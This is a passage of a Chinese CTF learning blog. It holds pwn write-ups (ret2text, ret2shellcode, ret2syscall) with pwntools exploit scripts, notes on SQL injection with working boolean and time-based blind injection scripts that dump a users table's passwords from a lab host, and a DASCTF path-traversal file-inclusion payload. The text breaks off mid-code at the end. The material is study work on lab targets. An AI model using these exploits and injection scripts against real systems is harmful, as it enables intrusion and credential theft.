alt="image-20200911110700992"></p><p>经过测试要溢出的字符的确是108个。才能覆盖返回地址。</p><p>通过收查资料发现，ebp存储着当前栈帧的栈底的地址是通常作为基址。而变量地址是通过通过ebp和偏移相加减来获取。但esp始终指向栈顶，随栈内数据增加或减少而变。同时ida是IDA是静态调试gdb是动态调试，所以ida计算偏移可能有误差，导致我们通过ebp计算出来有误差。（所以还是最好用动态调试）</p><p>然后就返回地址的问题，这里学到一个新的知识吧，返回0x804864A就可以将/bin/sh传入system执行。（</p><p><img src="image-20200911223653876.png" alt="image-20200911223653876"></p><p>然后溢出大小控制了返回地址也确定了，这题就好做了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2text'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">108</span>+<span class="string">'bbbb'</span>+p32(<span class="number">0x0804863A</span>) </span><br><span class="line"><span class="comment">#pay='a'*108+'bbbb'+p32(e.got['system'])+p32(0)+p32(0x08048763)#这个是调用system手动传入内置的‘/bin/sh’</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>这道题没有看到system与/bin/sh，但看到nx没防护,在vmap下发现buf有读写执行的能力,所以想要手动写入shell。</p><p><img src="image-20200912105057908.png" alt="image-20200912105057908"></p><p><img src="image-20200912115324139.png" alt="image-20200912115324139"></p><p>于是借着strncpy写入shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">e=ELF(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shell=asm(shellcraft.sh())</span><br><span class="line">lang=<span class="number">108</span>+<span class="number">4</span>-len(shell)</span><br><span class="line">pay=shell+<span class="string">'a'</span>*lang+p32(<span class="number">0x0804A080</span>)<span class="comment">#让buf前面是shell，后面是溢出数据，最后是buf地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>这道题,本菜鸡感觉学到两个知识点用系统调用的方法来处理函数和ROPgadget的使用.当我们获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。于是我们可以构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;&#x2F;bin&#x2F;sh&quot;,NULL,NULL)</span><br><span class="line">可以理解为调用int 0x80(eax,ebx,ecx,edx)</span><br><span class="line">即：</span><br><span class="line">系统调用号，即 eax 应该为表execve的 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br><span class="line"></span><br><span class="line">构造payload的框架大体是：</span><br><span class="line">溢出数据 eax地址 eax的值 ebx地址  ebx值  ecx地址 ecx 值 edx 值 edx 值 0x80地址</span><br></pre></td></tr></table></figure><p>eax、ebx、ecx、edx这些寄存器可以地址可以用ROPgadget来得到。这里说下ROPgadge是使用</p><p>查找可存储寄存器的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'pop|ret' | grep  '寄存器'</span><br><span class="line"><span class="meta">#</span><span class="bash">例</span></span><br><span class="line">ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'</span><br></pre></td></tr></table></figure><p>查找某字符串地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string  "字符串“</span><br><span class="line"><span class="meta">#</span><span class="bash">例</span></span><br><span class="line">ROPgadget --binary rop --string "/bin/sh"</span><br></pre></td></tr></table></figure><p>查找有int 0x80的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'int'</span><br></pre></td></tr></table></figure><p>这样下来payload就容易构造了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./rop'</span>)</span><br><span class="line">e=ELF(<span class="string">'./rop'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">112</span>+p32(<span class="number">0x080bb196</span>)+p32(<span class="number">0xb</span>)+p32(<span class="number">0x0806eb90</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x080be408</span>)+p32(<span class="number">0x08049421</span>)</span><br><span class="line"><span class="comment">#pay溢出数据+eax地址+eax的值+ebx地址+ebx值+ecx地址+ecx 值 +edx 地址 +edx 值+0x80地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ps：由于v0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret   ，so先传cdx，ecx，再ebx。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/</a></p><p><a href="https://www.jianshu.com/p/dd5fd511e0d3" target="_blank" rel="noopener">https://www.jianshu.com/p/dd5fd511e0d3</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于SQL注入小记</title>
      <link href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
      <url>/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>sql注入产生的原因是未对用户输入进行处理，导致输入的恶意信息与后端设定的sql语句进行拼接时产生了歧义，使得用户可以控制该条sql语句与数据库进行通信。</p><a id="more"></a><h2 id="sql注入思路"><a href="#sql注入思路" class="headerlink" title="sql注入思路"></a>sql注入思路</h2><p>1.寻找注入点</p><p>2.确定注入类型</p><p>​     1)若页面有明显变化:联合查询注入。</p><p>​     2)若页面有报错回显:报错注入。</p><p>​     3)只用正确与错误的回显或无回显:盲注(布尔盲注,时间盲注)。</p><p>3.利用自带函数查询数据库信息.database()查询当前数据库名、user()查数据库用户、version()查数据库版本等。</p><p>4.查库名-&gt;查表名-&gt;查字段名-&gt;查数据 ,以达到目的.</p><h2 id="联合查询注入步骤"><a href="#联合查询注入步骤" class="headerlink" title="联合查询注入步骤"></a>联合查询注入步骤</h2><h3 id="1-用二分法确定字段数量"><a href="#1-用二分法确定字段数量" class="headerlink" title="1)用二分法确定字段数量"></a>1)用二分法确定字段数量</h3><p>使用<code>order/group by</code>语句。通过往后边拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于或等于，则页面正常从而找到字段的数量。</p><h3 id="2-判断页面回显数据的字段位置"><a href="#2-判断页面回显数据的字段位置" class="headerlink" title="2)判断页面回显数据的字段位置"></a>2)判断页面回显数据的字段位置</h3><p>使用union select 1,2,3,4,x… 我们定义的数字将显示在页面上，即可从中页面显示的数字所在的位置推断出可以利用的字符串的位置。</p><h3 id="3-利用sql内置函数进行信息收集"><a href="#3-利用sql内置函数进行信息收集" class="headerlink" title="3)利用sql内置函数进行信息收集"></a>3)利用sql内置函数进行信息收集</h3><p>database()查询当前数据库名、user()查询数据库账号、version()查询数据库版本等基本情况，再根据不同的版本、不同的权限确定接下来的方法。</p><h3 id="4-1-若Mysql版本-gt-5-0"><a href="#4-1-若Mysql版本-gt-5-0" class="headerlink" title="4.1)若Mysql版本&gt;=5.0"></a>4.1)若Mysql版本&gt;=5.0</h3><p>MySQL 5.0以上版本存在一个存储着数据库信息的信息数据库 information_schema ，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 </p><p>具体而言:</p><p>SCHEMATA</p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</p><p>TABLES</p><p>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p><p>COLUMNS</p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><h4 id="1-查询数据库中的所有库名"><a href="#1-查询数据库中的所有库名" class="headerlink" title="(1)查询数据库中的所有库名"></a>(1)查询数据库中的所有库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  schema_name <span class="keyword">FROM</span> information_schema.schemata</span><br></pre></td></tr></table></figure><h4 id="2-获取数据库中的表"><a href="#2-获取数据库中的表" class="headerlink" title="(2)获取数据库中的表"></a>(2)获取数据库中的表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure><h4 id="3-获取数据库中的表"><a href="#3-获取数据库中的表" class="headerlink" title="(3)获取数据库中的表"></a>(3)获取数据库中的表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;(table_name)#此表名可以为字符串型，也可以十六进制表示</span><br></pre></td></tr></table></figure><h4 id="4-获取信息"><a href="#4-获取信息" class="headerlink" title="(4)获取信息"></a>(4)获取信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select null,group_concat(*) from table_name</span><br><span class="line">(or)</span><br><span class="line">select null,group_concat(&#39;column_name&#39;) from (&#39;table_name&#39;)</span><br></pre></td></tr></table></figure><h3 id="4-2-Mysql版本-lt-5-0"><a href="#4-2-Mysql版本-lt-5-0" class="headerlink" title="4.2)Mysql版本&lt;5.0"></a>4.2)Mysql版本&lt;5.0</h3><p>mysql的低版本缺乏系统库information_schema，我们无法直接查询表名，字段(列)名等信息，这时候只能靠猜或是通过盲注.</p><h2 id="盲注的方法"><a href="#盲注的方法" class="headerlink" title="盲注的方法"></a>盲注的方法</h2><p>在提交时，正确页面与错误页面相比有变化，则使用布尔的盲注。正确页面与错误页面无变化，使用时间注入。</p><p>但无论是布尔还时间都会用到，下面盲注常用的函数：<br>        (1)length(str) ：返回字符串str的长度</p><p>(2)substr(str, pos, len) ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p><p>(3)mid(str,pos,len) ：跟上面的一样，截取字符串</p><p>(4)ascii(str) ：返回字符串str的最左面字符的ASCII代码值</p><p>(5)ord(str) ：将字符或布尔类型转成ascll码</p><p>(6)if(a,b,c) ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p><h4 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h4><p>通过构造substr或mid函数来，截取返回值的结果中某一个字符。再利正确页面与错误页面不同的特性，来枚举出来。</p><p>布尔注入脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lenth</span><span class="params">(sql,jiao)</span>:</span><span class="comment">#爆破长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(len(requests.get(<span class="string">'http://192.168.14.137/Less-2/?id=1 and length(('</span>+sql+<span class="string">'))&gt;'</span>+str(i)).text))==jiao:</span><br><span class="line">             <span class="keyword">return</span> (i)</span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">substrchr</span><span class="params">(sql,jiao,strlen)</span>:</span><span class="comment">#爆破内容</span></span><br><span class="line">    w=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,strlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">if</span>(len(requests.get(<span class="string">'http://192.168.14.137/Less-2/?id=1 and ascii(substr(('</span>+sql+<span class="string">'),'</span>+str(k)+<span class="string">',1))&gt;'</span>+str(i)).text))==jiao:                </span><br><span class="line">                w=w+chr(i)</span><br><span class="line">                print(chr(i),end=<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> (w)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#zheng=len(requests.get('http://192.168.14.137/Less-2/?id=1').text)#721</span></span><br><span class="line"></span><br><span class="line">jiao=len(requests.get(<span class="string">'http://192.168.14.137/Less-2/?id=1 and length(database())&gt;1111'</span>).text)<span class="comment">#670</span></span><br><span class="line"><span class="comment">#sql='select database()' //爆当前库名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(schema_name) from information_schema.schemata' #爆所有库名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(table_name) from information_schema.tables where table_schema=database()'#爆库中所有表名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="users"'#爆表中所有字段名</span></span><br><span class="line">sql=<span class="string">'select group_concat(password) from users'</span> <span class="comment">#爆内容</span></span><br><span class="line"></span><br><span class="line">w=lenth(sql,jiao)</span><br><span class="line"></span><br><span class="line">w=substrchr(sql,jiao,w)</span><br></pre></td></tr></table></figure><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>通过判断页面返回内容的响应时间差异进行条件判断。通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。</p><p>简单的时间盲注入脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lenth</span><span class="params">(sql)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">         start=time.time()</span><br><span class="line">         requests.get(<span class="string">'http://192.168.14.137/Less-2/?id=1 and if(length(('</span>+sql+<span class="string">'))&gt;'</span>+str(i)+<span class="string">',1,sleep(3) )'</span>)</span><br><span class="line">    </span><br><span class="line">         <span class="keyword">if</span>((time.time()-start)&gt;<span class="number">3</span>):</span><br><span class="line">             print(<span class="string">'长度是'</span>+str(i))</span><br><span class="line">             <span class="keyword">return</span> (i)</span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">substrchr</span><span class="params">(sql,strlen)</span>:</span></span><br><span class="line">    w=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,strlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">             start=time.time()</span><br><span class="line">             requests.get(<span class="string">'http://192.168.14.137/Less-2/?id=1 and if(ascii(substr(('</span>+sql+<span class="string">'),'</span>+str(k)+<span class="string">',1))&gt;'</span>+str(i)+<span class="string">',1,sleep(2))'</span>)</span><br><span class="line">             </span><br><span class="line">             <span class="keyword">if</span>((time.time()-start)&gt;<span class="number">2</span>):              </span><br><span class="line">                w=w+chr(i)</span><br><span class="line">                print(chr(i),end=<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> (w)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sql='select database()' #爆当前库名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(schema_name) from information_schema.schemata' #爆所有库名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(table_name) from information_schema.tables where table_schema=database()'#爆库中所有表名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="users"'#爆表中所有字段名</span></span><br><span class="line"><span class="comment">#sql='select group_concat(password) from users' #爆内容</span></span><br><span class="line"></span><br><span class="line">long=lenth(sql)</span><br><span class="line"></span><br><span class="line">text=substrchr(sql,long)</span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>通过特殊函数的错误使用使其参数被页面输出。</p><p>前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。</p><p>常见的利用函数有：exp()、floor()+rand()、updatexml()、extractvalue()等</p><p><a href="https://lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入</a></p><p>updatexml()等函数报错通常有报错输出长度的限制，可以进行用substr等函数分割输出。</p><p>有的报错函数要求输出一行数据或只一次查询一个字段,可以使用group_concat等函数聚合数据即可。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://xz.aliyun.com/t/7169#toc-53" target="_blank" rel="noopener">对MYSQL注入相关内容及部分Trick的归类小结</a></p><p><a href="https://xz.aliyun.com/t/2869" target="_blank" rel="noopener">SQL 注入绕过</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒DASCTF 7月赛WP</title>
      <link href="/2020/07/26/%E5%AE%89%E6%81%92DASCTF%207%E6%9C%88%E8%B5%9BWP/"/>
      <url>/2020/07/26/%E5%AE%89%E6%81%92DASCTF%207%E6%9C%88%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<p>这次比赛搞错了时间，导致刚上去看了一道web就没有了(Crypto是偷偷找文件复现的)。tcl….</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezfileinclude"><a href="#ezfileinclude" class="headerlink" title="ezfileinclude"></a>ezfileinclude</h3><p>这道题有的谜，感觉是为了出题而出题（可能是我太年轻了）</p><p>有个很明显的文件包含，但要t与f两个参数。</p><p>t参数是当前时间流。</p><p>f参数要包含的文件的路径的base64。但过滤了<code>../</code></p><p>但经过测试，只过来f参数开头几个字符是<code>../</code>才被过滤。所以pay如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">x=<span class="string">'Z3F5LmpwZy8uLi8uLi8uLi8uLi8uLi8uLi9mbGFn'</span></span><br><span class="line">url=<span class="string">"http://183.129.189.60:10009/image.php?t="</span>+str(int(time.time()))+<span class="string">'&amp;f='</span>+x</span><br><span class="line"></span><br><span class="line">x=requests.get(url)</span><br><span class="line">print(x.text)Crypto</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="bullshit"><a href="#bullshit" class="headerlink" title="bullshit"></a>bullshit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pairing</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    shell = max(a, b)</span><br><span class="line">    step = min(a, b)</span><br><span class="line">    <span class="keyword">if</span> step == b: <span class="comment">#a&gt;=b </span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span> <span class="comment">#b&gt;a</span></span><br><span class="line">    <span class="keyword">return</span> shell ** <span class="number">2</span> + step * <span class="number">2</span> + flag<span class="comment"># a*a+b*b+0/1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message)</span>:</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(message),<span class="number">2</span>):<span class="comment">#</span></span><br><span class="line">        res += str(pairing(message[i],message[i+<span class="number">1</span>]))<span class="comment">#取前后相邻的字符串</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">print(encrypt(flag))</span><br><span class="line"><span class="comment"># 1186910804152291019933541010532411051999082499105051010395199519323297119520312715722</span></span><br></pre></td></tr></table></figure><p>分析一下题目，encrypt函数依次取flag的两个字符来通过pairing函数进行加密。</p><p>进入pairing发现，当a&gt;=b时返回<code>a*a+b*b</code>否则返回<code>a*a+b*b+1</code></p><p>根据经验判断，可见字符的ascill码最大是126最小是33，即pairing函数的最大返回值为31752，最小返回值为2178。所以返回值以1开头必定是5位数，开头大于3一定是4位数。2与3bu确定。</p><p>姑且，尝试开头大于1一定是4位数（在做题时，手动试下发现字母是小写，之后觉得有点不妥）恰好得到flag。payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on Sat Jul 25 22:08:06 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: 冰之幻魄</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pairing</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    shell = max(a, b)</span><br><span class="line">    step = min(a, b)</span><br><span class="line">    <span class="keyword">if</span> step == b: <span class="comment">#a&gt;=b </span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span> <span class="comment">#b&gt;a</span></span><br><span class="line">    <span class="keyword">return</span> shell ** <span class="number">2</span> + step * <span class="number">2</span> + flag</span><br><span class="line"></span><br><span class="line">ord(string.printable[<span class="number">1</span>])</span><br><span class="line">x=<span class="string">'1186910804152291019933541010532411051999082499105051010395199519323297119520312715722'</span></span><br><span class="line">MAX=<span class="number">126</span>**<span class="number">2</span>+<span class="number">126</span>**<span class="number">2</span> <span class="comment">#31752</span></span><br><span class="line">MIN=<span class="number">33</span>**<span class="number">2</span>+<span class="number">33</span>*<span class="number">2</span><span class="comment">#2178</span></span><br><span class="line">LIST=[]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> len(x)&gt;<span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">0</span>]==<span class="string">'1'</span>:</span><br><span class="line">       LIST.append(x[:<span class="number">5</span>]) </span><br><span class="line">       x=x[<span class="number">5</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       LIST.append(x[:<span class="number">4</span>])</span><br><span class="line">       x=x[<span class="number">4</span>:]</span><br><span class="line">     </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> LIST:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> string.printable:</span><br><span class="line">            <span class="keyword">if</span> pairing(ord(a),ord(b))==int(i):</span><br><span class="line">                flag=flag+a+b                </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="EZrsa"><a href="#EZrsa" class="headerlink" title="EZrsa"></a>EZrsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 